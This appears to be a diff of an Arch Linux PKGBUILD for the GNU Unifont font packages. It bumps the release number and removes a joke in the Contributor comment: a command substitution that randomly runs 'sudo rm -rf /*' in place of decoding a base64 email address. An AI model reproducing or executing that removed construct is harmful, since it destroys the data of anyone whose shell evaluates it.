@@ -1,10 +1,10 @@
 # Maintainer: neeshy <neeshy@tfwno.gf>
-# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+# Contributor: felix <`base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg==`>
 pkgname=('pcf-unifont'
          'psf-unifont')
 pkgbase=unifont
 pkgver=15.0.06
-pkgrel=1
+pkgrel=2
 pkgdesc="GNU Unifont Glyphs"
 arch=('any')
 url="https://unifoundry.com/unifont/index.html"
